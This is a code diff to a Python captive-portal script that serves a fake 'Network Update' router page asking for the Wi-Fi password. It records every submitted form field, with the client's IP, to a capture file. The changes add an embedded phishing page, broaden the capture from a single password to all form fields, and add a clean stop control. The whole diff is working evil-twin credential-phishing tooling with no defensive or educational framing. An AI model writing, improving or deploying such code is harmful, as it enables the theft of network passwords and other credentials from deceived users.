@@ -10,27 +10,42 @@ import threading
 import time
 import socket
 from datetime import datetime
+from urllib.parse import parse_qs
 
 # ==================== CONFIGURATION ====================
 HTML_FILE = "Router_update_v2.html"
 PORT = 80
 CAPTIVE_PORTAL_SSID = ""
 AP_STATIC_IP = "192.168.1.1/24"
+FORM_OUTPUT_FILE = "captured_form_data.txt"
+PORTAL_HTML = ""
+EMBEDDED_PORTAL_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Update</title>
+</head>
+<body>
+  <h1>Network Update</h1>
+  <p>Enter the required information to continue.</p>
+  <form method="post">
+    <label for="wifi_password">Wi-Fi Password</label>
+    <input type="text" id="wifi_password" name="wifi_password" required>
+    <button type="submit">Submit</button>
+  </form>
+</body>
+</html>
+"""
 
 # ==================== HTTP SERVER CLASS ====================
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Handle GET requests - display login page"""
         print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
-        
-        # Always redirect to login page
-        try:
-            with open(HTML_FILE, 'r', encoding='utf-8') as f:
-                html_content = f.read()
-        except FileNotFoundError:
-            print(f"[{datetime.now()}] ERROR: HTML file not found: {HTML_FILE}")
-            html_content = "<html><body><h1>Error: Portal page not found</h1></body></html>"
-        
+
+        # Always display login page regardless of path (improves captive portal reach)
+        html_content = PORTAL_HTML or EMBEDDED_PORTAL_HTML
         self.send_response(200)
         self.send_header('Content-type', 'text/html; charset=utf-8')
         self.send_header('Content-Length', len(html_content.encode('utf-8')))
@@ -38,33 +53,31 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.wfile.write(html_content.encode('utf-8'))
 
     def do_POST(self):
-        """Handle POST requests - save password"""
+        """Handle POST requests - save submitted form data"""
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
         
-        # Parse form data
-        password = ""
-        for item in post_data.split('&'):
-            if item.startswith('wifi_password='):
-                password = item.split('=')[1]
-                password = password.replace('+', ' ')
-                if '%' in password:
-                    import urllib.parse
-                    password = urllib.parse.unquote(password)
-        
+        form_data = parse_qs(post_data, keep_blank_values=True)
+
         client_ip = self.client_address[0]
-        print(f"[{datetime.now()}] New password from {client_ip}: {password}")
-        
-        # Save password to file
-        if password and CAPTIVE_PORTAL_SSID:
-            filename = f"{CAPTIVE_PORTAL_SSID}.txt"
-            try:
-                with open(filename, 'a', encoding='utf-8') as f:
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    f.write(f"[{timestamp}] IP: {client_ip} | Password: {password}\n")
-                print(f"[{datetime.now()}] Password saved to file: {filename}")
-            except Exception as e:
-                print(f"[{datetime.now()}] ERROR saving to file: {e}")
+        print(f"[{datetime.now()}] New form submission from {client_ip}: {form_data}")
+
+        # Save form data to file
+        output_name = FORM_OUTPUT_FILE
+        if CAPTIVE_PORTAL_SSID:
+            output_name = f"{CAPTIVE_PORTAL_SSID}_{FORM_OUTPUT_FILE}"
+        output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_name)
+        try:
+            with open(output_path, 'a', encoding='utf-8') as f:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                f.write(f"[{timestamp}] IP: {client_ip}\n")
+                for key, values in form_data.items():
+                    joined = ", ".join(values)
+                    f.write(f"{key}: {joined}\n")
+                f.write("-" * 40 + "\n")
+            print(f"[{datetime.now()}] Form data saved to file: {output_path}")
+        except Exception as e:
+            print(f"[{datetime.now()}] ERROR saving to file: {e}")
         
         # Response to client
         self.send_response(200)
@@ -174,6 +187,17 @@ def get_interface_info():
     
     return interface_info
 
+def load_portal_html():
+    """Load portal HTML from file or fall back to embedded HTML."""
+    if os.path.exists(HTML_FILE):
+        try:
+            with open(HTML_FILE, 'r', encoding='utf-8') as f:
+                return f.read()
+        except OSError as e:
+            print(f"[{datetime.now()}] ERROR reading HTML file: {e}")
+    print(f"[{datetime.now()}] Using embedded HTML (missing or unreadable {HTML_FILE}).")
+    return EMBEDDED_PORTAL_HTML
+
 def start_captive_portal(interface, ssid):
     """Start captive portal on selected interface"""
     global CAPTIVE_PORTAL_SSID
@@ -196,16 +220,34 @@ def start_captive_portal(interface, ssid):
         server_thread = threading.Thread(target=server.serve_forever)
         server_thread.daemon = True
         server_thread.start()
-        
+
         print(f"\n✅ Captive portal started!")
         print(f"📡 Address: http://{server_ip}")
         print(f"⏱️  Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"\nℹ️  Connection info will be displayed below:")
+        print("🛑 Press Enter to stop the portal.")
         print(f"{'='*60}\n")
         
+        stop_event = threading.Event()
+
+        def wait_for_stop():
+            try:
+                sys.stdin.readline()
+                print(f"\n[{datetime.now()}] Stop requested via Enter.")
+            except Exception:
+                print(f"\n[{datetime.now()}] Stop requested.")
+            stop_event.set()
+            server.shutdown()
+
+        stop_thread = threading.Thread(target=wait_for_stop, daemon=True)
+        stop_thread.start()
+
         # Main loop
-        while True:
-            time.sleep(1)
+        while not stop_event.is_set():
+            time.sleep(0.5)
+
+        server.server_close()
+        print(f"[{datetime.now()}] Captive portal stopped")
             
     except KeyError:
         print(f"\n❌ No IP address assigned to interface {interface}")
@@ -366,12 +408,9 @@ def main():
     print("CAPTIVE PORTAL MANAGER")
     print("="*60)
     
-    # Check if HTML file exists
-    if not os.path.exists(HTML_FILE):
-        print(f"\n❌ HTML file not found: {HTML_FILE}")
-        print(f"   Place your {HTML_FILE} in the same directory as this script")
-        print(f"   Or rename your HTML file to {HTML_FILE}")
-        sys.exit(1)
+    # Load portal HTML
+    global PORTAL_HTML
+    PORTAL_HTML = load_portal_html()
     
     # 1. List interfaces
     interfaces = get_interface_info()
